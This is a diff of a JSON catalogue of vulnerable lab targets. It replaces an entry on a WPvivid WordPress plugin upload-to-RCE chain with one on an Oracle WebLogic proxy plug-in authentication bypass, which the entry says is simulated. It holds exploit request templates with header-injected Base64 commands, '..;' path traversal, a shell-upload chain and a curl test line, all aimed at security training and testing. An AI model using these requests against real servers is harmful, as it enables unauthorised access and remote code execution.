@@ -1,95 +1,189 @@
 [
   {
-    "id": "vt-2026-1357",
+    "id": "vt-2026-21962",
     "info": {
-      "name": "WPvivid Backup & Migration - Unauthenticated Arbitrary File Upload to RCE",
+      "name": "Oracle WebLogic Server Proxy Plug-in - Authentication Bypass",
       "author": "omarkurt",
-      "description": "The Migration, Backup, Staging - WPvivid Backup & Migration plugin for\nWordPress is vulnerable to unauthenticated arbitrary file upload in versions\nup to and including 0.9.123. The vulnerability stems from improper error\nhandling in the RSA decryption process combined with a lack of path\nsanitization when writing uploaded files. When openssl_private_decrypt()\nfails, execution continues and passes a boolean false value to phpseclib's\nAES cipher initialization, which interprets it as null bytes. This allows\nattackers to encrypt malicious payloads using a predictable null-byte key.\nCombined with unsanitized filenames that permit directory traversal,\nattackers can upload arbitrary PHP files to publicly accessible directories\nand achieve Remote Code Execution via the wpvivid_action=send_to_site\nparameter.\n",
+      "description": "\u26a0\ufe0f  NOTE: This is a SIMULATED vulnerability environment using Python/Flask.\nThe actual Oracle WebLogic Server is NOT included. The lab emulates the\nvulnerable behavior for educational purposes.\n\nCVE-2026-21962 is a critical authentication bypass vulnerability in Oracle HTTP Server and\nthe WebLogic Server Proxy Plug-in for Apache HTTP Server and Microsoft IIS. The vulnerability\nexists due to improper handling of incoming requests by the WebLogic Server Proxy Plug-ins.\n\nAn unauthenticated remote attacker can exploit this flaw by sending specially crafted HTTP\nrequests with manipulated proxy headers (wl-proxy-client-ip, proxy-client-ip, x-forwarded-for)\nto bypass authentication controls and gain unauthorized access to backend WebLogic Server\nresources. Successful exploitation can result in unauthorized creation, deletion, or\nmodification of critical data, or full compromise of all data accessible through the\naffected servers.\n",
       "targets": [
-        "wordpress",
-        "wpvivid-backuprestore",
-        "php"
+        "oracle-weblogic",
+        "oracle-http-server",
+        "weblogic-proxy-plugin"
       ],
       "type": "CVE",
-      "cve": "CVE-2026-1357",
-      "cwe": "CWE-434",
+      "cve": "CVE-2026-21962",
+      "cwe": "CWE-287",
       "cvss": {
-        "score": 9.8,
-        "severity": "critical",
-        "metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+        "score": 10.0,
+        "severity": "critical"
       },
       "affected_versions": [
-        "<= 0.9.123"
-      ],
-      "patched_versions": [
-        "0.9.124"
+        "Oracle HTTP Server: 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0",
+        "WebLogic Server Proxy Plug-in (Apache): 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0",
+        "WebLogic Server Proxy Plug-in (IIS): 12.2.1.4.0"
       ],
       "tags": [
-        "wordpress",
-        "wpvivid",
-        "php",
-        "cve-2026",
-        "file-upload",
-        "rce",
-        "unauthenticated",
+        "oracle",
+        "weblogic",
+        "auth-bypass",
         "critical",
-        "path-traversal",
-        "crypto-fail-open"
+        "cve-2026",
+        "proxy",
+        "middleware"
       ],
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-1357",
-        "https://www.wordfence.com/threat-intel/vulnerabilities/id/e5af0317-ef46-4744-9752-74ce228b5f37",
-        "https://github.com/LucasM0ntes/POC-CVE-2026-1357",
-        "https://github.com/microcyberr/CVE-2026-1357",
-        "https://vulnerabletarget.com/VT-2026-1357"
+        "https://www.oracle.com/security-alerts/cpujan2026.html",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-21962",
+        "https://www.cve.org/CVERecord?id=CVE-2026-21962",
+        "https://arcticwolf.com/resources/blog/cve-2026-21962/",
+        "https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/cve-2026-21962-oracle-weblogic-proxy-auth-bypass",
+        "https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-21962-in-oracle-http-and-weblogic/",
+        "https://vulnerabletarget.com/VT-2026-21962"
       ]
     },
-    "vulnerabilities": {
-      "endpoint": "/",
-      "method": "POST",
-      "param": "wpvivid_content",
-      "auth_required": false,
-      "precondition": "wpvivid_api_token must exist in DB (migration key generated in plugin settings)",
-      "request": "POST / HTTP/1.1\nHost: {{target}}\nContent-Type: application/x-www-form-urlencoded\n\nwpvivid_action=send_to_site&wpvivid_content={{payload_base64}}\n",
-      "response": "HTTP/1.1 200 OK\n\n{\"result\":\"success\",\"op\":\"finished\"}\n",
-      "payload_details": "Payload is a binary packet: [3-char hex RSA key length][fake RSA key][16-char hex ciphertext length][AES-128-CBC encrypted JSON]\n- Fake RSA key (e.g. \"ABC\") triggers openssl_private_decrypt() failure -> returns false\n- phpseclib treats false as 16 null bytes (\\x00*16) for AES key\n- Attacker encrypts JSON with same null key: AES-128-CBC(key=\\x00*16, iv=\\x00*16)\n- JSON contains path traversal in \"name\" field: \"../uploads/shell.php\"\n- File written to wp-content/uploads/ bypassing .htaccess protected backup dir\n"
-    },
-    "technical": "The vulnerability exists in the WPvivid plugin's remote site migration\nfeature (wpvivid_action=send_to_site). Two bugs chain together:\n\n**Bug 1 - Cryptographic Fail-Open (class-wpvivid-crypt.php):**\nIn decrypt_message(), RSA decryption failure returns false. The code does NOT\ncheck this return value and passes false to phpseclib's Crypt_Rijndael->setKey().\nphpseclib casts false to empty string, padded with null bytes to 16 bytes.\nAttacker encrypts payload with known null key: AES-128-CBC(key=\\x00*16, iv=\\x00*16).\n\n**Bug 2 - Path Traversal (class-wpvivid-send-to-site.php):**\nIn send_to_site(), the $params['name'] from decrypted JSON is used unsanitized:\n  $file_path = WP_CONTENT_DIR . '/' . $dir . '/' . str_replace('wpvivid','wpvivid_temp',$params['name']);\nUsing \"../uploads/file.php\" escapes the backup directory to wp-content/uploads/.\n\n**Exploit Chain:**\n1. Send fake RSA key (\"ABC\") -> openssl_private_decrypt() fails -> returns false\n2. phpseclib uses false as key -> becomes \\x00*16\n3. Attacker encrypts JSON payload with \\x00*16 key -> server decrypts successfully\n4. JSON name=\"../uploads/shell.php\" -> path traversal writes to public directory\n5. Uploaded PHP file is accessible -> RCE achieved\n",
-    "owasp": {
-      "category": "A03:2021",
-      "name": "Injection"
-    },
-    "impact": "Successful exploitation allows unauthenticated remote attackers to upload\narbitrary PHP files to the WordPress web root, achieving full Remote Code\nExecution (RCE) on the server. This can lead to complete site takeover,\ndata exfiltration, backdoor installation, lateral movement within the\nhosting environment, and use of the compromised server for further attacks.\n",
-    "remedy": "Update the WPvivid Backup & Migration plugin to version 0.9.124 or later.\nAudit the server for any unauthorized PHP files in publicly accessible\ndirectories. Review server access logs for suspicious requests to the\nwpvivid_action=send_to_site endpoint.\n",
-    "remediation": [
-      "Upgrade WPvivid Backup & Migration plugin to version 0.9.124 or later",
-      "Audit wp-content/uploads/ for unauthorized PHP files",
-      "Review access logs for POST requests with wpvivid_action=send_to_site",
-      "Consider disabling the migration key when not actively migrating",
-      "Implement WAF rules to block wpvivid_action=send_to_site from external sources"
+    "vulnerabilities": [
+      {
+        "id": 1,
+        "name": "Full Headers Bypass",
+        "description": "Uses all three vulnerable headers with localhost IP and Base64 payload",
+        "endpoint": "/bea_wls_internal/ProxyServlet",
+        "method": "GET",
+        "headers": [
+          {
+            "name": "wl-proxy-client-ip",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          },
+          {
+            "name": "proxy-client-ip",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          },
+          {
+            "name": "x-forwarded-for",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          }
+        ],
+        "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0 (compatible; Exploit/1.0)\nAccept: */*\nConnection: close\n",
+        "response": "HTTP/1.1 200 OK\nServer: WebLogic Server 14.1.1.0.0\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n"
+      },
+      {
+        "id": 2,
+        "name": "Direct ProxyServlet Access",
+        "description": "Direct access to ProxyServlet with injected headers (no path traversal)",
+        "endpoint": "/bea_wls_internal/ProxyServlet",
+        "method": "GET",
+        "headers": [
+          {
+            "name": "wl-proxy-client-ip",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          },
+          {
+            "name": "proxy-client-ip",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          },
+          {
+            "name": "x-forwarded-for",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          }
+        ],
+        "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
+        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n"
+      },
+      {
+        "id": 3,
+        "name": "Single Header Bypass",
+        "description": "Bypass using only wl-proxy-client-ip header",
+        "endpoint": "/bea_wls_internal/ProxyServlet",
+        "method": "GET",
+        "headers": [
+          {
+            "name": "wl-proxy-client-ip",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          }
+        ],
+        "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
+        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n"
+      },
+      {
+        "id": 4,
+        "name": "Console Path Traversal",
+        "description": "Access via console path traversal",
+        "endpoint": "/console/..;/bea_wls_internal/ProxyServlet",
+        "method": "GET",
+        "headers": [
+          {
+            "name": "wl-proxy-client-ip",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          },
+          {
+            "name": "proxy-client-ip",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          },
+          {
+            "name": "x-forwarded-for",
+            "value": "127.0.0.1;Y21kOndob2FtaQ=="
+          }
+        ],
+        "request": "GET /console/..;/bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
+        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n"
+      },
+      {
+        "id": 5,
+        "name": "Different Payload - Reverse Shell Command",
+        "description": "Bypass with different Base64 encoded payload (id command)",
+        "endpoint": "/bea_wls_internal/ProxyServlet",
+        "method": "GET",
+        "headers": [
+          {
+            "name": "wl-proxy-client-ip",
+            "value": "127.0.0.1;Y21kOmlk"
+          },
+          {
+            "name": "proxy-client-ip",
+            "value": "127.0.0.1;Y21kOmlk"
+          },
+          {
+            "name": "x-forwarded-for",
+            "value": "127.0.0.1;Y21kOmlk"
+          }
+        ],
+        "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOmlk\nproxy-client-ip: 127.0.0.1;Y21kOmlk\nx-forwarded-for: 127.0.0.1;Y21kOmlk\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
+        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<pre>cmd:id</pre>\n"
+      },
+      {
+        "id": 6,
+        "name": "Normal Request - Should Fail",
+        "description": "Request without malicious headers (should return 401)",
+        "endpoint": "/bea_wls_internal/ProxyServlet",
+        "method": "GET",
+        "headers": [],
+        "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
+        "response": "HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm=\"WebLogic Server\"\n\n<title>401 Unauthorized</title>\n<h1>401 Unauthorized</h1>\n"
+      }
     ],
+    "technical": "The vulnerability exists in the WebLogic Server Proxy Plug-in's request handling mechanism.\nThe plug-in fails to adequately validate and sanitize incoming HTTP headers used for\nproxy functionality, specifically:\n\n- wl-proxy-client-ip\n- proxy-client-ip\n- x-forwarded-for\n\nAttackers can inject malicious payloads by:\n1. Using semicolon-delimited values instead of comma-delimited (bypassing IP validation)\n2. Appending Base64-encoded commands (Y21kOndob2FtaQ== decodes to \"cmd:whoami\")\n3. Path traversal sequences (..;) to access restricted internal endpoints like /bea_wls_internal/ProxyServlet\n\nThe ProxyServlet is an internal WebLogic component that should not be directly accessible\nfrom external sources. The authentication bypass allows attackers to route requests through\nthis servlet, potentially accessing backend administration interfaces and internal APIs.\n",
+    "impact": "Critical impact due to CVSS 10.0 severity:\n\n- Unauthorized access to backend WebLogic Server resources\n- Complete authentication bypass on affected proxy configurations\n- Ability to create, modify, or delete critical data\n- Potential for full system compromise\n- Lateral movement into internal network segments\n- Access to administrative interfaces and sensitive configuration data\n\nThe vulnerability is particularly dangerous because:\n- It requires no authentication\n- It has low attack complexity\n- It can be exploited over standard HTTP/HTTPS\n- WebLogic is widely deployed in enterprise environments\n- The proxy plug-in sits between public internet and internal applications\n",
+    "remedy": "1. Apply Oracle's January 2026 Critical Patch Update immediately:\n   https://www.oracle.com/security-alerts/cpujan2026.html\n\n2. Temporary mitigations (until patching):\n   - Restrict network exposure of Oracle HTTP Server and WebLogic Proxy Plug-in\n   - Place behind WAF (Web Application Firewall) with appropriate rules\n   - Implement IP allowlisting for administrative access\n   - Monitor for suspicious requests containing injected headers\n   - Block access to /bea_wls_internal/ paths at the network perimeter\n\n3. Review and harden proxy configurations:\n   - Disable unused functional modules\n   - Follow principle of least privilege\n   - Do not expose services to internet unless necessary\n",
     "poc": {
       "nuclei": [
-        "vt-2026-1357.nuclei.yaml"
+        "vt-2026-21962.nuclei.yaml"
       ]
     },
     "providers": {
       "docker-compose": {
         "path": "docker-compose.yaml",
-        "port": 8321
+        "image": "ghcr.io/happyhackingspace/vt-2026-21962:latest",
+        "ports": [
+          8090
+        ]
       }
     },
     "post-install": [
-      "Start lab: docker compose up -d",
-      "Wait for setup container to complete (~30 seconds)",
-      "Access WordPress: http://localhost:8321",
-      "Admin login: admin / admin",
-      "WPvivid 0.9.123 is pre-installed and active with migration key generated",
-      "Run nuclei: nuclei -t vt-2026-1357.nuclei.yaml -u http://localhost:8321",
-      "Verify upload: curl http://localhost:8321/wp-content/uploads/vt-nuclei-test.txt"
+      "Proxy Servlet endpoint: http://localhost:8090/bea_wls_internal/ProxyServlet",
+      "Use vt-2026-21962.nuclei.yaml to test for authentication bypass",
+      "Test: curl -H 'wl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==' http://localhost:8090/bea_wls_internal/ProxyServlet"
     ],
     "category": "cves",
-    "added_date": "2026-02-13T15:59:59+03:00"
+    "added_date": "2026-02-14T09:05:59+03:00"
   },
   {
     "id": "vt-2025-24963",
